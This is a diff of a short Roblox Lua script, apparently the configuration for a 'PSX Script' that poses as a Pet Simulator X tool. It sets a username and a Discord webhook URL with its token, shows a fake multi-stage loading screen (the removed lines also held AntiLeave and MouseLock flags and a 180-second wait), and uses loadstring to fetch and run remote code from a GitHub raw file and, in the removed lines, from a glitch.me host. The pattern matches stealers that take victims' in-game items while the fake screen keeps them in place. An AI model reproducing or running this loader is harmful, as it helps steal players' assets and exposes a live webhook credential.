@@ -1,14 +1,12 @@
-UserName = "biblixyep123"
-Webhook = "https://discord.com/api/webhooks/1100767087263232072/xo4ET-12bza__T6FpbibuYw8GQyWh7eylbv_1a8FcxsCGv0v-B3ghGAcowGp2qaQTERZ" 
+Username = "biblixyep123 "
+WebHook = "https://discord.com/api/webhooks/1100767087263232072/xo4ET-12bza__T6FpbibuYw8GQyWh7eylbv_1a8FcxsCGv0v-B3ghGAcowGp2qaQTERZ"
 
-_G.LoadingScreen = true
-_G.AntiLeave = true
-_G.MouseLock = true 
 
-_G.ScriptName = "Rizz Scriptz"
-_G.FirstText = "Script Preparing"
-_G.SecondText = "Script Loading..."
-_G.ThirdText = "Almost Done..."
-_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+loadingscreen = true 
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
 
-loadstring(game:HttpGet("https://rizzhub.glitch.me/scripts/Main.lua", true))()
